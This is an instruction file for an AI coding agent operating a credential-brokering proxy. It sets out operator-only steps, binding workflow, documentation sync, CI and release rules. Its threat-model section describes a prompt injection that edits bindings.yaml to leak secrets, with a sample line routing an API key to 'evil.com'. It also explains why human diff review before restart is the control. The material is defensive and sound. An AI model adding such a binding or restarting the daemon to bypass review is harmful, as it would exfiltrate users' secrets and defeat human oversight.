# Claude Code instructions

Repo conventions, hard constraints, doc rules, commit-style: see [`AGENTS.md`](./AGENTS.md). This file is Claude-specific operating notes that augment those.

## Operating AVP as Claude

Claude can drive AVP end-to-end **without ever holding a real secret**. The division of labor:

| Action | Who does it |
|---|---|
| Edit `bindings.yaml` — placeholders, templates, binding hosts, scope | **Claude** — operator reviews diff before restart |
| Validate the YAML (pydantic loader, dry-run only) | **Claude** |
| Read the audit log to debug a binding mismatch | **Claude** |
| Suggest the BWS secret name + write the binding around it | **Claude** |
| **Restart the daemon** (`docker compose restart`, `systemctl restart`, `ans … --tags …`) | **Operator only** — security boundary, see below |
| **Add the real secret value to Bitwarden** | **Operator only** — Claude must not see the value |
| Rotate / revoke the BWS machine-account token | **Operator only** |
| Read `secrets/bws-token` or `/etc/kow/bws-token` | **Never** — that's the daemon's token, not for the agent |

### Why restart is the operator's job

Restart is what makes a new `bindings.yaml` go live. Before restart, the file is just text on disk. After restart, every secret AVP holds can be routed to wherever the new config says.

That means anyone (or any prompt injection) who can write `bindings.yaml` AND trigger a restart can exfil every real secret AVP brokers, with a single-line edit:

```yaml
OPENAI_API_KEY:
  bindings:
    - host: "api.openai.com"
    - host: "evil.com"          # added — now the real key leaks here
```

The git-diff review *before* the operator restarts is the only thing standing between an injected edit and a deployed exfil channel. If Claude both edits and restarts, the review window collapses to zero. So:

- Claude **edits** `bindings.yaml` (the operator sees the diff in `git diff` / IDE / PR).
- Operator **restarts** after reviewing the diff.
- Never chain the two from Claude — even for "just a one-line tweak."

The same logic applies to the Ansible role's `kow_secrets` var: Claude edits the var, the operator runs `ans … --tags kow`.

**R-RESTART (binding rule).** Any automation that restarts AVP on a `bindings.yaml` change defeats the entire credential isolation model. That includes `fswatch` / `inotify` watchers, `make restart` targets Claude can invoke via shell, `post-commit` / `post-receive` git hooks, GitHub Actions auto-deploys, and "while you're in there, can you also restart so I can verify my unrelated fix?" requests where the operator restarts without re-reading the bindings diff. If diff review feels tedious enough that you want to automate it away, the fix is a better diff tool, not auto-restart. The diff *is* the security control.

## Workflow: "add a new binding"

1. Ask the operator the **service name** and the **auth shape** (Bearer? Basic? `X-API-Key`? Composite of multiple values?).
2. Pick a BWS secret name (or names, for composite — up to 4). Write the binding block in `bindings.yaml` with a clearly-fake placeholder string (operator-recognizable, e.g. `slack_PLACEHOLDER_01HXY...`).
3. Tell the operator: "Add `<BWS_NAME>` to the BWS project with the real value."
4. Validate config-load (dry-run, no service change): `python -c 'from kow.config import load_config; load_config("bindings.yaml")'`.
5. **Hand off to the operator** for the restart. After the operator confirms restart, verify via a real request from the calling shell + grep the audit log for an `inject_decision allowed` event.

For composite bindings (multi-value templates), see `bindings.example.yaml` and `docs/architecture.md` §4.2.

## `skills/kow/` ships with the product — update it in the SAME commit

`skills/kow/` is a user-facing artifact: people drop it into their agent and it becomes the only
thing the agent knows about kow. Nothing imports it, no test asserts on it, and CI cannot fail
because of it, so it rots silently and the rot is only discovered when an agent confidently gives a
user wrong instructions about this product.

That has already happened. `References/NoteSchema.md` documented the note grammar but never said
that notes are **one of eight injector types**, so an agent read the six-key table as the product's
full capability and told the maintainer that kow "structurally cannot" broker OAuth2
client-credentials — a feature that had shipped months earlier (ADR-0030).

**Touching any of these means editing `skills/kow/` in the same commit:**

| If you change… | Update |
|---|---|
| an injector type, or add a new one | `References/NoteSchema.md` injector table; `SKILL.md` decision rule |
| an audit `reason=` string, or its meaning | `SKILL.md` § Diagnosing — the reason table is a diagnostic contract |
| fail-closed behaviour (what the CLIENT sees on a denial) | `SKILL.md` § fail-closed signatures. Header returns 503; body sends an empty body. These differ, and each gets misread as a different bug |
| `_ALLOWED_NOTE_KEYS`, the marker line, or placeholder format | `References/NoteSchema.md` allowed-keys table; `SKILL.md` quick reference |
| `binding_source` precedence | the precedence-trap notes in both files |
| a CLI subcommand or flag used in the workflows | `Workflows/*.md` |

**The same claims live in more than one file, so check all of them.** `docs/troubleshooting.md`
duplicates the audit-reason and fail-closed contracts; `docs/architecture.md` duplicates the
capability and precedence claims. A maintainer can follow the table above to the letter and still
ship two documents that disagree. Before committing a behaviour change, grep for the claim, not
just the filename:

```bash
rg -n 'secret_unavailable|fail-closed|binding_source|injector types' docs/ skills/ README.md CLAUDE.md
```

If that returns hits in files your diff does not touch, you are shipping a contradiction. The
injector-type COUNT is the canary — `_INJECTOR_TYPES` in `config_models.py` is the source of truth,
and prose saying "eight" while the dict holds ten is exactly the drift this section exists to catch.

**Keep it public-clean.** The shipped skill and `docs/` must name no real customer, vendor,
hostname, account identifier or personal path. Real incidents are valuable and should be kept, but
written as "one commercial provider" and `api.example.com`. Concrete error strings and status codes
are the teaching content — preserve those verbatim.

**Two copies exist for a reason.** A maintainer may also run a private, personalised copy of this
skill in their own agent config. Fixes must land HERE, in the repo, or every user keeps the bug.

## Dependency edits — regenerate both lockfiles

If you touch `pyproject.toml` deps, regenerate `requirements.lock` *and* `requirements-dev.lock` in the same commit using the snippet in [`AGENTS.md` → Dependency changes](./AGENTS.md#dependency-changes). Don't hand-edit a lockfile to "just add one package" — the hash-pinning + cooldown gate (`scripts/check-lockfile-hashes.py` + `scripts/check-lockfile-drift.sh`, mirrored in CI) will fail the commit. Operator reviews the lockfile diff alongside the code diff before merge.

## CI failures — canonical repo + the traps we keep hitting

**The canonical repo is `inflightsec/keys-on-the-wire` (`origin`).**

Each rule below is here because we broke it.

1. **Two scanners, two waiver lists — keep them identical or `test.yml` reddens while `security.yml` stays green.** The same lockfile CVEs are suppressed in *two unshared places*: osv-scanner reads `osv-scanner.toml` `[[IgnoredVulns]]`; pip-audit reads inline `--ignore-vuln <GHSA>` flags on **both** `audit-lockfile` steps (production + dev) in `.github/workflows/test.yml` (pip-audit has no config-file support). When a mitmproxy-transitive CVE appears or a waiver changes, edit **both** so the sets match exactly. *(A waiver added to `osv-scanner.toml` but not `test.yml` is exactly what reddened `audit-lockfile` twice — the scheduled `security` run stays green and hides it, because that job only runs osv-scanner.)*

2. **Regenerate lockfiles ONLY with `scripts/regen-lockfiles.sh`.** It uses the same 7-day cooldown cutoff and tempfile semantics as `check-lockfile-drift.sh`, so the result matches the drift gate. A manual `uv pip compile` with a hand-picked `--exclude-newer` produces drift the pre-commit + CI gate rejects, and leaves stale staged churn behind. If **Claude** regenerates them in the shared NFS clone, `chmod 664` both locks afterward or the operator's `end-of-file-fixer` pre-commit hook dies with `PermissionError` (the files end up `claude`-owned and group-read-only).

3. **A CI fix is not done until you have watched the run go green.** After the operator pushes, pull the live result and confirm the *specific* previously-red job is now green: `gh api "repos/inflightsec/keys-on-the-wire/actions/runs?branch=main"` → the failing run's `/jobs` → `/actions/jobs/{id}/logs`. Identify which job + step is red *before* theorizing (the scheduled `security` workflow ≠ the `test` workflow's `audit-lockfile` job — they fail for different reasons). Never declare green from the diff alone.

4. **`lockfile-drift` can fail with NO dependency change — that's the 7-day cooldown window sliding forward, not a mistake.** The gate re-resolves against `now − 7 days` on every run; when a dep releases just under the window and then ages past it, the committed lock goes stale and the pre-commit hook + CI redden even though nothing was touched. Fix is the same one command every time: `bash scripts/regen-lockfiles.sh`, then the operator commits (`chore(deps): rollforward lockfiles for 7-day cooldown`) + pushes — no version bump, this is dev/CI hygiene, not a release. Do **NOT** hand-roll `uv pip compile -o <lockfile>`: writing onto the existing lock makes uv read and *preserve* its stale pins, so it never converges (burned 3 attempts on a `ruff 0.15.19 → 0.15.20` rollforward exactly this way). `regen-lockfiles.sh` compiles to a tempfile with `--refresh` then moves it in — the only path whose bytes match the gate. Dry-run `bash scripts/check-lockfile-drift.sh` before committing to confirm it's absorbed.

## Releasing — STRICT RULES

Full release loop in [`CONTRIBUTING.md` "Releasing"](./CONTRIBUTING.md#releasing). The mechanical sequence:

```bash
bash scripts/bump-version.sh 0.X.Y           # mechanical bump, every location
$EDITOR CHANGELOG.md README.md               # CHANGELOG entry + Status prose
git add -A && bash scripts/pre-release.sh    # 12-check gauntlet, fails closed
git commit -m "release: v0.X.Y" && git tag -a v0.X.Y -m "AVP v0.X.Y"
git push origin main && git push origin v0.X.Y
```

Each rule below is here because we broke it.

1. **`pyproject.toml` is the source of truth for the version.** Never edit version literals by hand — always `scripts/bump-version.sh <X.Y.Z>`. `pre-release.sh` section 3 validates that `__init__.py`, README install line, README clone tag, and `docker-compose.yml` image tag all agree with pyproject. If they don't, re-run `bump-version.sh`. *(v0.4.2 shipped with `__init__.py` stuck at `"0.4.1"` because the bumper only edited pyproject.)*

2. **`pre-release.sh` runs AFTER `git commit`, not before.** Its first check is `git status --porcelain` — expects a clean tree. If it fails post-commit, `git reset --soft HEAD~1` restores staging without losing edits, fix, re-run. *(The v0.4.3 first handoff ran pre-release before commit and tripped the dirty-tree check.)*

3. **Push `main` first, then push the tag.** The tag-push fires `release.yml`; the commit needs to be on `origin/main` first so the tag points at a published SHA. Approve the `pypi` environment when GitHub prompts — that manual reviewer gate is the second line of defense after this file's diff-review rule.

4. **Inside `sh -eux -c '...'` blocks (smoke harness Dockerfile, test scripts): NO apostrophe characters anywhere — neither in code nor in comments.** A bare `'` closes the outer quote and breaks parsing with `unexpected EOF while looking for matching '''`. Use uppercase "APOSTROPHE" in comments if you need to reference the character. Run `bash -n <script>` after every edit. *(The v0.4.3 first attempt tripped on "mitmdump's argparse" in a Dockerfile comment.)*

5. **`build-and-smoke-wheel.sh` exercises the `INSTALL_SOURCE=local` Dockerfile branch; `release.yml`'s post-publish smoke exercises `INSTALL_SOURCE=pypi`.** Different code paths. The local dry-run cannot fully validate the PyPI branch — that's what the daily `pypi-canary` workflow is for. If `pypi-install-smoke` flakes in CI, re-run the failed job first (likely PyPI CDN propagation race); the published wheel is unaffected. If user-facing release matters and the smoke is blocking, manually create the GitHub Release page via Releases → Draft new release → existing tag.

6. **Never `--no-verify` past pre-commit hooks** (security gates). Never re-tag an existing version (PyPI is immutable per version — ship a patch release instead). Never yank for cosmetic skew (e.g., `__version__` reports wrong number but wheel installs correctly) — ship a follow-up patch instead.

## Tooling map (release-relevant)

| Script | Purpose |
|---|---|
| `scripts/bump-version.sh <X.Y.Z>` | Mechanical version bump across every tracked location |
| `scripts/pre-release.sh` | 12-check pre-tag gauntlet (version agreement, lint, types, tests, lockfile, zizmor, wheel smoke, e2e) |
| `scripts/smoke-test-wheel.sh` | Single source of truth for wheel-validation logic (build + install + import-only entry-point check). `test.yml`'s `wheel-smoke` job mirrors this |
| `scripts/build-and-smoke-wheel.sh` | Pre-tag dry-run: builds local wheel + runs `tests/pypi-smoke/run.sh --local-wheel` |
| `tests/pypi-smoke/` | Docker compose harness — exercised by `release.yml` post-publish smoke, daily `pypi-canary`, and local dry-run |
| `tests/docker-e2e/` | Production-Dockerfile e2e harness — runs in `pre-release.sh` step 12 and in CI's `e2e-docker` job |

## What this repo will NOT do

The full out-of-scope list lives in [`AGENTS.md`](AGENTS.md). Highlights: no egress-firewall behavior, no kernel-level network policy, no multi-tenant routing, no proxy-engine swap. (The injector taxonomy is complete — OAuth refresh, AWS SigV4, `hmac`/`jwt_bearer` all shipped; backends are BWS + GSM + static. New backends still need an issue first.)
